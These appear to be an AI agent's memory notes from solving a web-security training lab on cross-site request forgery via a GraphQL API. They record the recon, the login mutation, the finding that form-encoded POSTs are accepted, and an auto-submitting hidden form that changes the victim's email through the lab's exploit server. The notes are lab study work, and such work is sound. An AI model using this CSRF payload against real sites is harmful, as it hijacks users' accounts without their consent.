---
metadata:
  node_type: memory
name: "prs-arm-a-lab-graphql-csrf-via-graphql-api"
description: "arm A baseline: lab-graphql-csrf-via-graphql-api solved cold in one pass - GraphQL login/changeEmail at /graphql/v1, urlencoded POST accepted, exploit-server responseFile must be /exploit (footgun guard on \"/\")"
last_updated: 2026-10-10T11:08:08+08:00
created: 2026-10-10T11:08:08+08:00
---

arm A baseline: cold instance, solved in one pass.

Path/recon:
- page_read the canonical academy path -> lab_id EE2C1298...; range_launch launch-url <path> --jar /tmp/cj1.json -> reused:false.
- Instance root HTML carries the exploit-server link (exploit-<id>.exploit-server.net); exploit_server:null in the launch envelope again proved NOT to be absence.
- /login form is JS-driven (`gqlLogin(this,event,'/my-account')`); its `<script src>` refs are /resources/js/gqlUtil.js (defines endpoint `/graphql/v1`, JSON fetch) and /resources/js/loginGql.js (mutation login($input: LoginInput!){login(input:$input){token success}}). POST /login directly = 405, so login must go through GraphQL.

GraphQL surface:
- Endpoint POST /graphql/v1. Introspection gave mutationType fields = login, changeEmail, both taking a single `input` arg (LoginInput / ChangeEmailInput).
- Login: JSON body `{"query":"mutation login($input: LoginInput!){login(input:$input){token success}}","variables":{"input":{"username":"wiener","password":"peter"}}}` -> success:true, Set-Cookie `session=...; Secure; SameSite=None` (CSRF-friendly, no token check).
- CSRF precondition confirmed: the same endpoint accepts a form-urlencoded POST (`--form query=... --form variables=...`) and returned data.changeEmail.email — the sink ignores Content-Type.

Exploit:
- Stored on the exploit server: `http_session post <exploit>/ --form urlIsHttps=on --form responseFile=/exploit --form responseHead=... --form responseBody=<auto-submit form> --form formAction=STORE`, then the same fields + `--form formAction=DELIVER_TO_VICTIM --follow`.
- Payload = hidden form action=<instance>/graphql/v1 method=POST with name=query (changeEmail mutation) and name=variables ({"input":{"email":"hacked@evil-user.net"}}), plus document.forms[0].submit().

Blockers/lessons:
- exploit-server STORE rejects responseFile="/" with `{"error":"footgun detected"}` (would overwrite its own control page); the accepted default is /exploit, and that path is what DELIVER_TO_VICTIM serves. Empirically the field validation order is responseFile (must start with /) -> footgun -> responseHead required.
- DELIVER_TO_VICTIM returns 302 /deliver-to-victim -> 302 / ; --follow is required, and the followed page shows the `is-solved` banner + "Congratulations, you solved the lab!" (that is the flip evidence).

